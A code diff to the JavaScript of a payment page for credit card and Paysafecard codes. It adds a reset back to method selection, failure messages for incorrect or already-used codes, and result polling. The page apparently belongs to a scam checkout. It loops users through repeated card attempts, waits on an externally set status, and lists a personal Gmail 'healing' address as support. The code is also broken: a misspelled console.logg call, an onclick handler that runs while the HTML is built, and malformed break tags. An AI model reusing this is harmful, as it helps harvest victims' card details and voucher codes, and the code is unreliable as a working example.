@@ -258,6 +258,30 @@ function initializeCreditCardState() {
     };
 }
 
+function backToMethod(state, elements) {
+    console.logg('hhhh');
+    setTimeout(() => {
+        state.creditCardTrials = 0;
+        state.creditCardError = false;
+        state.methodSelected = false;
+        state.selectedMethod = "";
+        state.creditCardIndex = 0;
+        state.safeIndex = 0;
+
+        elements.paymentDisplay.innerHTML = state.initialContent;
+
+        let element = cacheDOMElements();
+        setupEventListeners(state, element);
+
+        element.makePaymentBtn.disabled = !state.methodSelected;
+
+        document.getElementById("payment-details")?.
+            classList.remove("active")
+
+        document.getElementById("payment-method-section")?.classList.add("active")
+    }, 3000);
+}
+
 // ==================== CREDIT CARD HANDLING ====================
 function handleCreditCard(state, elements) {
     state.creditCardSections = createCreditCardSections(state);
@@ -298,25 +322,7 @@ function handleCreditCard(state, elements) {
 
                         // then for redirecting bk to selecting methods
 
-                        setTimeout(() => {
-
-                            state.creditCardTrials = 0;
-                            state.creditCardError = false;
-                            state.methodSelected = false;
-                            // state.selectedMethod = "paysafe";
-
-                            elements.paymentDisplay.innerHTML = state.initialContent;
-
-                            let element = cacheDOMElements();
-                            setupEventListeners(state, element);
-
-                            element.makePaymentBtn.disabled = !state.methodSelected;
-
-                            document.getElementById("payment-details")?.
-                                classList.remove("active")
-
-                            document.getElementById("payment-method-section")?.classList.add("active")
-                        }, 3000);
+                        backToMethod(state, elements);
                     }
 
                     handleCreditCard(state, elements);
@@ -591,7 +597,7 @@ function safeAlerts() {
     runFlow(safeFlow, "start");
 }
 
-function getResult(state) {
+function getResult(state, elements) {
     const status = state.paymentStatus;
     const message = state.statusMessage;
 
@@ -604,7 +610,7 @@ function getResult(state) {
             </div>
 
             <div class="outcome-section">
-                <i class="bi ${status == true ? 'bi-check-circle-fill' : 'bi-x-circle-fill'}"></i>
+                <i class="${status == true ? 'bi bi-check-circle-fill' : 'bi bi-x-circle-fill'}"></i>
 
                 <h1>${status == true ? 'Payment Successful'
             : message.toString().includes("incorrect") ? 'Incorrect Code' : "Code Already Used"
@@ -612,16 +618,17 @@ function getResult(state) {
             </div>
 
             <div class="steps">
-                <p class="verification-text">Your payment with Paysafecard is complete.
+                <p class="verification-text">
+                ${status == true ? `Your payment with Paysafecard is complete.
                 </<br/>
                 </<br />
-                Thank you for your trust.
+                Thank you for your trust.`: message.toString().includes("incorrect") ? 'The Paysafecard code you entered is not correct. Please check the digits and try again.' : "The Paysafecode you entered has already been used. Please try a different code."}
                 </p>
             </div>
 
             <div class="proceed-div">
-                <button class="continue-btn">Continue</button>
-                <p class="small-text">A confirmation has been sent to your email.</p>
+                <button class="continue-btn" onclick="${status !== true ? backToMethod(state, elements):''}" >${status == true ? "Continue" : "Try Again"}</button>
+                <p class="small-text">${status == true ? `A confirmation has been sent to your email.` : `Need help?  <a href="mailto:healingwithcharlottecasiraghi@gmail.com" style="color:var(--link);">Contact Support</a>`} </p>
             </div>
         </div>
     `
@@ -644,29 +651,36 @@ function fetchResultData(state) {
     return data;
 }
 
+let timer = null;
 async function handleResults(state, elements) {
     let data = fetchResultData(state);
     const status = data.status;
-    let result;
-    let timer;
 
     if (status === null) {
-        timer = setInterval(() => {
-            data = fetchResultData(state);
-            handleResults(state, elements);
-        }, 1000);
-        // console.log("not done");
+        if (!timer) {
+            timer = setInterval(() => {
+                data = fetchResultData(state);
+                if (data.status !== null) {
+                    clearInterval(timer);
+                    timer = null;
+
+                    handleResults(state, elements);
+                }
+            }, 1000);
+        }
+        return;
     }
 
-    if (status !== null) {
+    if (timer) {
         clearInterval(timer);
-        result = getResult(state);
-
-        elements.paymentDisplay.innerHTML = "";
-        elements.paymentDisplay.insertAdjacentHTML("beforeend", result);
-        console.log("done");
-        // return;
+        timer = null;
     }
+
+    const result = getResult(state, elements);
+
+    elements.paymentDisplay.innerHTML = "";
+    elements.paymentDisplay.insertAdjacentHTML("beforeend", result);
+    console.log("done");
 
     // status !== null ?
     //     handleAlert("not null...", "toast") : handleAlert("null", "toast");
